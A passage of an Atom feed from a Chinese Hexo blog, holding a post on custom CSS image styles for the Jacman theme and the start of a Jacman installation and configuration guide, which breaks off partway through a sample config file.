&lt;h2 id=&quot;主题图片&quot;&gt;&lt;a href=&quot;#主题图片&quot; class=&quot;headerlink&quot; title=&quot;主题图片&quot;&gt;&lt;/a&gt;主题图片&lt;/h2&gt;&lt;p&gt;我比较喜欢像&lt;a href=&quot;http://www.36kr.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;36氪&lt;/a&gt;那样，一篇文章带一张相关图片。图片能传达的信息永远比文字丰富。当浏览文章列表时，除了标题最吸引人的自然就属文章主题图片了。&lt;/p&gt;
&lt;p&gt;所以为了方便使用，我创建了一个图片样式叫&lt;code&gt;img-topic&lt;/code&gt;，大概是长这样子的。&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;figcaption&gt;&lt;span&gt;/themes/jacman/source/css/_partial/index.styl&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.img-topic&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;max-width&lt;/span&gt;: 300&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;max-height&lt;/span&gt;: 1800&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;display&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;block&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;margin-left&lt;/span&gt;: &lt;span class=&quot;selector-class&quot;&gt;.7em&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;margin-right&lt;/span&gt;: &lt;span class=&quot;selector-class&quot;&gt;.7em&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;padding&lt;/span&gt;: 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;float&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;right&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;clear&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;right&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在博客中，我更希望主题图片居右，并且点进文章正文后该图片不会显示。我们可以使用HTML语法插入图片。&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=&lt;span class=&quot;string&quot;&gt;&quot;图片路径&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;img-topic&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这儿是一张使用&lt;code&gt;img-topic&lt;/code&gt;样式后的效果图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/81b78497jw1en8cj4beb9j20s80b8adb.jpg&quot; alt=&quot;img-topic效果图&quot;&gt;&lt;span class=&quot;caption&quot;&gt;img-topic效果图&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;Logo-图片&quot;&gt;&lt;a href=&quot;#Logo-图片&quot; class=&quot;headerlink&quot; title=&quot;Logo 图片&quot;&gt;&lt;/a&gt;Logo 图片&lt;/h2&gt;&lt;p&gt;Logo 图片可以快速定义一篇文章的主题。与主题图片非常类似，只不过 Logo  图片放置的是 Logo ，而且一般比主题图片要小。类似的，Logo 图片也是居右，并且在文章正文中不会显示。&lt;/p&gt;
&lt;p&gt;关于&lt;code&gt;img-logo&lt;/code&gt;的样式如下&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;figcaption&gt;&lt;span&gt;/themes/jacman/source/css/_partial/index.styl&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.img-logo&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;max-width&lt;/span&gt;: 180&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;max-height&lt;/span&gt;: 96&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;display&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;block&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;margin-right&lt;/span&gt;: &lt;span class=&quot;selector-class&quot;&gt;.7em&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;margin-left&lt;/span&gt;: &lt;span class=&quot;selector-class&quot;&gt;.7em&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;padding&lt;/span&gt;: 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;float&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;right&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;clear&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;right&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用HTML语法插入图片&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=&lt;span class=&quot;string&quot;&gt;&quot;图片路径&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;img-logo&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;效果如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/81b78497jw1en8cj55warj20se0avgoh.jpg&quot; alt=&quot;img-logo效果图&quot;&gt;&lt;span class=&quot;caption&quot;&gt;img-logo效果图&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;居中图片&quot;&gt;&lt;a href=&quot;#居中图片&quot; class=&quot;headerlink&quot; title=&quot;居中图片&quot;&gt;&lt;/a&gt;居中图片&lt;/h2&gt;&lt;p&gt;有网友抱怨 Jacman 的图片只能居左，他喜欢让图片居中却不知道该怎么做。为此，我也创建了一个图片样式叫&lt;code&gt;img-center&lt;/code&gt;，所需的代码很短。&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;figcaption&gt;&lt;span&gt;/themes/jacman/source/css/_partial/article.styl&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.img-center&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;display&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;block&lt;/span&gt; ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;margin&lt;/span&gt;: &lt;span class=&quot;selector-tag&quot;&gt;auto&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;阴影图片&quot;&gt;&lt;a href=&quot;#阴影图片&quot; class=&quot;headerlink&quot; title=&quot;阴影图片&quot;&gt;&lt;/a&gt;阴影图片&lt;/h2&gt;&lt;p&gt;有时候添加的图片可能会与文章背景混淆，使得读者看不清到底哪部分是图片哪部分是文章。使用&lt;code&gt;img-shadow&lt;/code&gt;为图片添加边角阴影可以更加凸显图片的位置，也能更美观。&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;figcaption&gt;&lt;span&gt;/themes/jacman/source/css/_partial/article.styl&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.img-shadow&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;selector-tag&quot;&gt;box-shadow&lt;/span&gt;: 0 0 2&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt; 3&lt;span class=&quot;selector-tag&quot;&gt;px&lt;/span&gt; &lt;span class=&quot;selector-id&quot;&gt;#ddd&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用HTML语法插入图片&lt;/p&gt;
&lt;figure class=&quot;highlight cs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=&lt;span class=&quot;string&quot;&gt;&quot;http://ww1.sinaimg.cn/large/81b78497jw1enhkcat9mqj20go06g0sy.jpg&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;img-shadow&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/81b78497jw1enhkcat9mqj20go06g0sy.jpg&quot; class=&quot;img-shadow&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;画廊图片&quot;&gt;&lt;a href=&quot;#画廊图片&quot; class=&quot;headerlink&quot; title=&quot;画廊图片&quot;&gt;&lt;/a&gt;画廊图片&lt;/h2&gt;&lt;p&gt;Hexo 中提供了一种文章类别叫&lt;code&gt;photo&lt;/code&gt;，Jacman 也为这种文章设计了图片浏览方式。具体效果可以看这篇 &lt;a href=&quot;http://wuchong.me/jacman/gallery/&quot;&gt;Demo&lt;/a&gt; 。&lt;code&gt;photo&lt;/code&gt;类文章的写法可以看 &lt;a href=&quot;https://raw.githubusercontent.com/wuchong/jacman/site/source/_posts/gallery.md&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Demo Sample&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/81b78497jw1en8cj4r4bij20sl0krn4x.jpg&quot; alt=&quot;photo文章效果图&quot;&gt;&lt;span class=&quot;caption&quot;&gt;photo文章效果图&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;图片备注&quot;&gt;&lt;a href=&quot;#图片备注&quot; class=&quot;headerlink&quot; title=&quot;图片备注&quot;&gt;&lt;/a&gt;图片备注&lt;/h2&gt;&lt;p&gt;Jacman 中可以方便地为图片提供备注。&lt;/p&gt;
&lt;figure class=&quot;highlight markdown&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;![&lt;span class=&quot;string&quot;&gt;添加你的备注&lt;/span&gt;](&lt;span class=&quot;link&quot;&gt;http://ww1.sinaimg.cn/mw690/81b78497jw1emfgts2pt4j21hc0u0k1c.jpg&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;效果就如下图，在图片左下方会显示关于图片的描述。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/mw690/81b78497jw1emfgts2pt4j21hc0u0k1c.jpg&quot; alt=&quot;添加你的备注&quot;&gt;&lt;span class=&quot;caption&quot;&gt;添加你的备注&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;OK，就这么多了，希望大家喜欢。如果嫌折腾麻烦，欢迎使用最新版的 &lt;a href=&quot;https://github.com/wuchong/jacman&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Jacman&lt;/a&gt;，可以直接使用以上定义的样式！&lt;/p&gt;
&lt;p&gt;&lt;em&gt;PS:有任何关于 Hexo 的问题，欢迎来 &lt;a href=&quot;https://coderq.com/c/tech/hexo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo 中文社区&lt;/a&gt; 咨询。&lt;/em&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/81b78497jw1en8b95t5kmj203j00u743.jpg&quot; class=&quot;img-logo&quot; /&gt;&lt;/p&gt;
&lt;p&gt;为一篇博客添加相关的图片可以快速吸引读者的目光，也能帮助读者理解文章概要，尤其是在写技术博客或是某些很复杂的东西时。&lt;/p&gt;
&lt;p&gt;然而，Hexo 主题一般只提供一种默认的图片样式，包括 Jacman。所以，我为 Jacman 实现了几种常见的图片样式。这里我会展示这几种图片样式以及其实现方法。&lt;/p&gt;
    
    </summary>
    
      <category term="Hexo" scheme="http://wuchong.me/categories/Hexo/"/>
    
    
      <category term="Hexo" scheme="http://wuchong.me/tags/Hexo/"/>
    
      <category term="Jacman" scheme="http://wuchong.me/tags/Jacman/"/>
    
  </entry>
  
  <entry>
    <title>如何使用 Jacman 主题</title>
    <link href="http://wuchong.me/blog/2014/11/20/how-to-use-jacman/"/>
    <id>http://wuchong.me/blog/2014/11/20/how-to-use-jacman/</id>
    <published>2014-11-20T01:58:17.000Z</published>
    <updated>2016-03-08T12:13:04.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;主题介绍&quot;&gt;&lt;a href=&quot;#主题介绍&quot; class=&quot;headerlink&quot; title=&quot;主题介绍&quot;&gt;&lt;/a&gt;主题介绍&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/wuchong/jacman&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Jacman&lt;/a&gt; 是一款扁平化，有着响应式设计的 &lt;a href=&quot;http://http://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt; 主题。本站正式使用了 Jacman 主题。Jacman 基于 &lt;a href=&quot;https://github.com/A-limon/pacman&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Pacman&lt;/a&gt; 主题修改而来，目前已有很多特性与原主题不同。你可以前往 &lt;a href=&quot;http://wuchong.me&quot;&gt;本站&lt;/a&gt; 和 &lt;a href=&quot;http://wuchong.me/jacman&quot;&gt;Demo&lt;/a&gt; 预览更多关于本主题的更多效果。如果你有任何问题或意见欢迎到 GitHub 发表 &lt;a href=&quot;https://github.com/wuchong/jacman/issues&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;issue&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;距离当初我把 Jacman 开源至今已有半年零一周了，在这半年里也一直保持着对 Jacman 的更新。看到很多人用这款主题，fork&amp;amp;star 数也越来越好看，我也更有动力继续完善 Jacman。Jacman 自然还有很多改进空间，首先是文档问题，有许多人通过博客、微博、QQ 询问我有关主题的问题，我也意识到之前写的帮助手册可读性太差。正好趁着这次 Jacman 大更新，写篇更详尽、readable 的手册。&lt;/p&gt;
&lt;h2 id=&quot;安装指南&quot;&gt;&lt;a href=&quot;#安装指南&quot; class=&quot;headerlink&quot; title=&quot;安装指南&quot;&gt;&lt;/a&gt;安装指南&lt;/h2&gt;&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;在博客根目录下执行如下命令。&lt;br&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ git &lt;span class=&quot;keyword&quot;&gt;clone&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;https&lt;/span&gt;://github.com/wuchong/jacman.git themes/jacman&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Jacman 需要安装 Hexo 2.7 及以上版本，请先升级您的 Hexo 程序，再启用此主题。&lt;/p&gt;
&lt;h3 id=&quot;启用&quot;&gt;&lt;a href=&quot;#启用&quot; class=&quot;headerlink&quot; title=&quot;启用&quot;&gt;&lt;/a&gt;启用&lt;/h3&gt;&lt;p&gt;修改你的博客根目录下的&lt;code&gt;_config.yml&lt;/code&gt;配置文件中的&lt;code&gt;theme&lt;/code&gt;属性，将其设置为&lt;code&gt;jacman&lt;/code&gt;。同时建议设置&lt;code&gt;stylus&lt;/code&gt;属性中的&lt;code&gt;compress&lt;/code&gt;值为true，会自动压缩 CSS 文件，hexo默认配置中不包含这一项，建议开启。如下。&lt;br&gt;&lt;figure class=&quot;highlight qml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;theme&lt;/span&gt;: jacman&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;stylus&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;attribute&quot;&gt;compress&lt;/span&gt;: &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;更新&quot;&gt;&lt;a href=&quot;#更新&quot; class=&quot;headerlink&quot; title=&quot;更新&quot;&gt;&lt;/a&gt;更新&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; themes/jacman&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git pull origin master&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;请先备份您主题目录下的 &lt;code&gt;_config.yml&lt;/code&gt; 文件后再升级。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;配置指南&quot;&gt;&lt;a href=&quot;#配置指南&quot; class=&quot;headerlink&quot; title=&quot;配置指南&quot;&gt;&lt;/a&gt;配置指南&lt;/h2&gt;&lt;p&gt;Jacman 主题提供了丰富的配置属性，可以实现您对主题的自定义。配置文件&lt;code&gt;_config.yml&lt;/code&gt;位于主题根目录下。本次更新对配置文件进行了较大调整，如您之前就使用了 Jacman，也需要您根据以下指南进行相应的修改。&lt;/p&gt;
&lt;figure class=&quot;highlight yaml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;##### 菜单&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;menu:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  主页: /&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  归档: /archives&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  关于: /about&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### 控件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;widgets:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; category&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; links&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;bullet&quot;&gt;-&lt;/span&gt; rss&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### RSS &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;rss:&lt;/span&gt; /atom.xml &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### 图片相关&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;imglogo:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  enable:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;               &lt;span class=&quot;comment&quot;&gt;## 是否显示网站 logo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  src:&lt;/span&gt; img/logo.png        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;favicon:&lt;/span&gt; img/favicon.ico     &lt;span class=&quot;comment&quot;&gt;## 网站图标    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;apple_icon:&lt;/span&gt; img/jacman.jpg   &lt;span class=&quot;comment&quot;&gt;## 苹果设备上的图标，背景不要透明&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;author_img:&lt;/span&gt; img/author.jpg   &lt;span class=&quot;comment&quot;&gt;## 网站底部的博主头像&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;banner_img:&lt;/span&gt; img/banner.jpg   &lt;span class=&quot;comment&quot;&gt;## 博客顶部的图片&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;### 主题颜色&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;theme_color:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;    theme:&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;#2ca6cb&#39;&lt;/span&gt;    &lt;span class=&quot;comment&quot;&gt;##默认主题颜色为蓝色&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;close_aside:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;      &lt;span class=&quot;comment&quot;&gt;##是否在文章页面自动关闭侧边栏&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### 首页相关&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;index:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  expand:&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;              &lt;span class=&quot;comment&quot;&gt;## 首页文章是否展开。默认为展开式，显示 Read More。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  excerpt_link:&lt;/span&gt; Read More    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#### 作者信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;author:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  intro_line1:&lt;/span&gt;  &lt;span class=&quot;string&quot;&gt;&quot;Hello ,I&#39;m Larry Page in Google.&quot;&lt;/span&gt;    &lt;span class=&quot;comment&quot;&gt;## 网站底部的个人介绍&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  intro_line2:&lt;/span&gt;  &lt;span class=&quot;string&quot;&gt;&quot;This is my blog,believe it or not.&quot;&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  weibo_verifier:&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;## 微博秀的验证码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  tsina:&lt;/span&gt;           &lt;span class=&quot;comment&quot;&gt;## 用于微博秀和微博分享&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  weibo:&lt;/span&gt;           &lt;span class=&quot;comment&quot;&gt;## 用于显示网站底部社交按钮，下同&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  douban:&lt;/span&gt;         &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  zhihu:&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  email:&lt;/span&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  twitter:&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  github:&lt;/span&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  facebook:&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  linkedin:&lt;/span&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;  